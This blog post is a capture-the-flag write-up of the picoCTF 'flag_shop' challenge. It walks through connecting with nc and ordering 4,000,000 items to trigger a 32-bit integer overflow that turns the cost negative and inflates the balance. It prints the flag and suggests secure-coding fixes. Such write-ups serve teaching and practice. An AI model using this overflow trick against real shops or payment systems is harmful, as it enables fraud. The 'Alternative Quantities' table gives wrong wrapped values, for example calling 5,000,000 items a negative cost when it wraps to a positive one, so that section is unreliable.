---
title: 'flag_shop'
date: '2025-11-07T00:00:00+08:00'
lastmod: '2025-11-07T00:00:00+08:00'
draft: false
description: 'A flag shop where you can buy flags. Can you exploit the integer overflow vulnerability to get enough money to purchase the expensive 1337 flag?'
summary: ''
tags: ["Medium", "General Skills", "picoCTF 2019"]
categories: []
series: []
author: "Zeus Dela Cruz"
tools: ["nc"]
techniques: ["Integer Overflow", "Arithmetic Exploitation", "Input Validation Bypass"]

# Enable features for post
showToc: true
TocOpen: false
hidemeta: false
comments: false
disableShare: false
disableHLJS: false
searchHidden: false
ShowReadingTime: true
ShowWordCount: true
ShowCodeCopyButtons: true

# Cover image (optional)
cover:
  image: '' # /images/filename.jpg
  alt: ''
  caption: ''
  relative: false
  hidden: false
  hiddenInList: false
  hiddenInSingle: false

# Canonical link (for SEO)
canonicalURL: ''

# External edit link
editPost:
  URL: "https://github.com/freymeyer/myportfolio/tree/main/content"
  Text: "Suggest Changes"
  appendFilePath: true
---

## Challenge Information

This challenge presents a virtual flag shop where you can purchase flags with your account balance. The goal is to buy the expensive "1337 Flag" which costs 100,000 dollars, but you start with only 1,100 dollars.

**Connection Details:**
```bash
nc jupiter.challenges.picoctf.org 4906
```

## Initial Reconnaissance

Upon connecting to the service, we're presented with a menu:

```
Welcome to the flag exchange
We sell flags

1. Check Account Balance
2. Buy Flags
3. Exit
```

Checking the account balance shows we start with **1,100 dollars**.

When we select "Buy Flags", we see two options:
1. **Definitely not the flag Flag** - 900 dollars each
2. **1337 Flag** - 100,000 dollars (only 1 in stock)

The problem: We need 100,000 dollars but only have 1,100. We can't afford the real flag!

## Vulnerability Analysis

The key vulnerability lies in how the application calculates the total cost when purchasing items. The calculation likely uses a 32-bit signed integer, which has the following range:

- **Minimum value**: -2,147,483,648
- **Maximum value**: 2,147,483,647

When we multiply the quantity by the price (900), if the result exceeds the maximum value, it **overflows** and wraps around to negative numbers!

### Integer Overflow Math

Let's calculate what happens when we try to buy a massive quantity:

```
Quantity: 4,000,000
Price per item: 900
Expected cost: 4,000,000 × 900 = 3,600,000,000
```

But 3,600,000,000 exceeds the maximum 32-bit signed integer value of 2,147,483,647. This causes an **integer overflow**, wrapping the value around:

```
3,600,000,000 - 4,294,967,296 (2^32) = -694,967,296
```

The application interprets this as a **negative cost**!

## Exploitation

### Step 1: Trigger the Integer Overflow

Connect to the service and select option 2 (Buy Flags):

```
Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
1
These knockoff Flags cost 900 each, enter desired quantity
4000000
```

### Step 2: Observe the Negative Cost

The application calculates the cost:

```
The final cost is: -694967296

Your current balance after transaction: 694968396
```

**What happened?**
- Starting balance: 1,100
- Cost: -694,967,296 (negative!)
- New balance: 1,100 - (-694,967,296) = 1,100 + 694,967,296 = **694,968,396**

Instead of paying money, we actually **gained** money due to the integer overflow!

### Step 3: Verify the Balance

Check the account balance to confirm:

```
Enter a menu selection
1

Balance: 694968396
```

Perfect! We now have more than enough to buy the expensive flag.

### Step 4: Purchase the 1337 Flag

Buy the real flag:

```
Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
2
1337 flags cost 100000 dollars, and we only have 1 in stock
Enter 1 to buy one
1
```

### Step 5: Capture the Flag

The application reveals the flag:

```
YOUR FLAG IS: picoCTF{m0n3y_bag5_9c5fac9b}
```

## Complete Solution Walkthrough

```bash
# Connect to the challenge
nc jupiter.challenges.picoctf.org 4906

# Menu: Select 2 (Buy Flags)
2

# Item: Select 1 (Definitely not the flag Flag)
1

# Quantity: Enter a large number to trigger overflow
4000000

# Result: Balance becomes 694,968,396 due to integer overflow

# Menu: Select 2 (Buy Flags)
2

# Item: Select 2 (1337 Flag)
2

# Confirm purchase
1

# Flag obtained: picoCTF{m0n3y_bag5_9c5fac9b}
```

## Understanding Integer Overflow

### What is Integer Overflow?

Integer overflow occurs when an arithmetic operation produces a result that exceeds the maximum value that can be stored in the allocated memory space.

For a 32-bit signed integer:
- Range: -2,147,483,648 to 2,147,483,647
- When you exceed the maximum, it wraps around to negative values
- When you go below the minimum, it wraps around to positive values

### Visual Representation

```
Max value: 2,147,483,647
                ↓ +1
Overflow →  -2,147,483,648
```

### Finding the Right Quantity

To find a quantity that causes overflow, we need:

```
quantity × price > 2,147,483,647
```

For our case (price = 900):
```
quantity > 2,147,483,647 ÷ 900
quantity > 2,386,092.94
```

So any quantity above approximately **2,386,093** will cause an overflow. I used **4,000,000** to ensure a significant overflow that would give us plenty of money.

## Alternative Quantities

Here are some other quantities that work:

```
Quantity: 2,386,093  → Overflow occurs
Quantity: 3,000,000  → Results in -1,494,967,296
Quantity: 5,000,000  → Results in -789,967,296
Quantity: 10,000,000 → Results in 1,705,032,704 (double overflow back to positive)
```

The sweet spot is between approximately 2.4 million and 4.7 million items for a single overflow into negative territory.

## Summary

1. **Initial State** → Connected with 1,100 dollars, need 100,000 for the flag
2. **Vulnerability Discovery** → Identified integer overflow in price calculation
3. **Overflow Calculation** → Determined 4,000,000 × 900 = overflow to negative
4. **Exploitation** → Purchased 4,000,000 items at negative cost
5. **Balance Increase** → Balance increased to 694,968,396 dollars
6. **Flag Purchase** → Bought the 1337 Flag for 100,000 dollars
7. **Flag Captured** → Retrieved flag from purchase confirmation

## Key Takeaways

- Integer overflow vulnerabilities can have serious security implications
- Always validate user input and check for arithmetic overflow
- Use appropriate data types (unsigned vs signed, 32-bit vs 64-bit)
- Modern languages provide overflow checking mechanisms
- Financial calculations should use safe arithmetic libraries
- Never trust client-side input validation alone

## Secure Coding Practices

To prevent this vulnerability, developers should:

1. **Input Validation**: Check if quantity × price exceeds safe limits before calculation
   ```c
   if (quantity > (INT_MAX / price)) {
       // Overflow would occur
       return ERROR;
   }
   ```

2. **Use Larger Data Types**: Use 64-bit integers for financial calculations
   ```c
   int64_t total = (int64_t)quantity * price;
   ```

3. **Overflow Detection**: Use compiler built-ins or libraries that detect overflow
   ```c
   if (__builtin_mul_overflow(quantity, price, &result)) {
       // Overflow detected
       return ERROR;
   }
   ```

4. **Sanity Checks**: Verify the result makes logical sense
   ```c
   if (total_cost < 0 || total_cost > balance) {
       return ERROR;
   }
   ```

## Flag

```
picoCTF{m0n3y_bag5_9c5fac9b}
```
